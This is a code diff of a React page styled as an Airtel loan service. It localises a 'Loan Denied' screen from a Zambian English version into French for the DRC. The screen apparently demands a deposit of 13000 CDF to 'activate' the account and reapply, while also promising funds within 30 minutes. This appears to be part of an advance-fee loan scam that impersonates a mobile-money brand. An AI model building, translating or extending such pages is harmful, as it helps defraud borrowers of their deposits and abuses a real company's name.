@@ -32,8 +32,8 @@ function AirtelDenied() {
             <line x1="3" y1="18" x2="21" y2="18"></line>
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel ZMW</h1>
-        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
+        <h1 className="airtel-logo">Airtel DRC</h1>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
 
       {/* Main White Card */}
@@ -47,8 +47,8 @@ function AirtelDenied() {
           </svg>
         </div>
 
-        <h2 className="airtel-denied-heading">Loan Denied!</h2>
-        <p className="airtel-denied-subtext">Your loan has been Denied</p>
+        <h2 className="airtel-denied-heading">Prêt refusé !</h2>
+        <p className="airtel-denied-subtext">Votre prêt a été refusé.</p>
 
         {/* Inactive Account Box */}
         <div className="airtel-inactive-box">
@@ -57,31 +57,28 @@ function AirtelDenied() {
               <rect x="2" y="5" width="20" height="14" rx="2"></rect>
               <line x1="2" y1="10" x2="22" y2="10"></line>
             </svg>
-            <span>Inactive Airtel</span>
+            <span>Airtel inactif</span>
           </div>
-          <p className="airtel-inactive-text">Please deposit at least</p>
-          <p className="airtel-inactive-amount">50 ZMW</p>
+          <p className="airtel-inactive-text">Veuillez déposer au moins</p>
+          <p className="airtel-inactive-amount">13000 CDF</p>
           <p className="airtel-inactive-text">
-            in your Airtel account to make it active and reapply
+            sur votre compte Airtel pour l'activer et faire une nouvelle demande.
           </p>
         </div>
 
         {/* Checklist Box */}
         <div className="airtel-checklist-box">
           <div className="airtel-checklist-item">
-            <span className="checkmark">✓</span> Funds will be transferred to your account within 30 minutes
+            <span className="checkmark">✓</span> Les fonds seront transférés sur votre compte dans un délai de 30 minutes.
           </div>
           <div className="airtel-checklist-item">
-            <span className="checkmark">✓</span> Loan repayment period: 6 months
-          </div>
-          <div className="airtel-checklist-item">
-            <span className="checkmark">✓</span> You can now access your Fast Credit dashboard
+            <span className="checkmark">✓</span> Période de remboursement du prêt : 12 mois
           </div>
         </div>
 
         {/* Dashboard Button */}
         <button className="airtel-dashboard-btn" onClick={handleGoToDashboard}>
-          Go to Dashboard
+          Aller au tableau de bord
           <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <line x1="5" y1="12" x2="19" y2="12"></line>
             <polyline points="12 5 19 12 12 19"></polyline>
@@ -90,7 +87,7 @@ function AirtelDenied() {
 
         {/* Back to Login Link */}
         <button className="airtel-back-to-login" onClick={handleBackToLogin}>
-          Back to login
+          Retour à la connexion
         </button>
       </div>
     </div>
